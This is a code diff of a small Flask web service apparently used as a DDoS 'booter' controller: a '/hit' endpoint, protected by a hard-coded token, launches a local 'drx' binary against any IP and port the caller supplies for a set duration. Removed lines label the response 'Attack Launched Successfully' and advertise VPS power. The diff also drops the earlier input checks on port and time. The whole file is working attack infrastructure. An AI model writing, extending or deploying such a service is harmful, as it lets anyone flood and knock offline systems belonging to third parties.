@@ -3,49 +3,36 @@ import subprocess
 import os
 
 app = Flask(__name__)
-
-# - Security Key taaki koi aur tumhari API use na kar sake
 API_AUTH_TOKEN = "DRX_POWER_ULTRA_V4"
+DRX_PATH = os.path.join(os.getcwd(), 'drx')
 
 @app.route('/hit', methods=['GET'])
 def start_attack():
-    # Auth Check
     token = request.args.get('token')
     if token != API_AUTH_TOKEN:
-        return jsonify({"status": "error", "message": "Unauthorized Access"}), 403
-
-    # - Parameters from Bot/App
+        return jsonify({"status": "error", "message": "Unauthorized"}), 403
+    
     target_ip = request.args.get('ip')
     target_port = request.args.get('port')
-    duration = request.args.get('time', "240") # Default string format mein rakhein
-
+    duration = request.args.get('time', "240")
+    
     if not target_ip or not target_port:
-        return jsonify({"status": "error", "message": "Missing IP or Port"}), 400
-
-    # Input Validation: Check karein ki IP aur Port valid numbers/format mein hain
-    # Taaki koi command injection na kar sake
-    if not target_port.isdigit() or not duration.isdigit():
-        return jsonify({"status": "error", "message": "Invalid Port or Time format"}), 400
-
+        return jsonify({"status": "error", "message": "Missing params"}), 400
+    
     try:
-        # - Binary ko background mein trigger karna
-        # ./drx ka path absolute ya relative check karein (ensure chmod +x drx kiya hai)
-        command = f"nohup ./drx {target_ip} {target_port} {duration} > /dev/null 2>&1 &"
-        
-        # subprocess.Popen use karna sahi hai background execution ke liye
-        subprocess.Popen(command, shell=True)
-        
-        return jsonify({
-            "status": "success",
-            "message": "Attack Launched Successfully",
-            "host": target_ip,
-            "port": target_port,
-            "time": duration,
-            "vps_status": "32GB_POWER_MAX"
-        })
+        subprocess.Popen(
+            [DRX_PATH, target_ip, target_port, duration],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
+        return jsonify({"status": "success", "message": "Launched"})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
+@app.route('/health', methods=['GET'])
+def health():
+    return jsonify({"status": "alive"}), 200
+
 if __name__ == '__main__':
-    # - Port 8080 par API live hogi
-    app.run(host='0.0.0.0', port=8080, debug=False)
+    port = int(os.getenv('PORT', 8080))
+    app.run(host='0.0.0.0', port=port, debug=False)
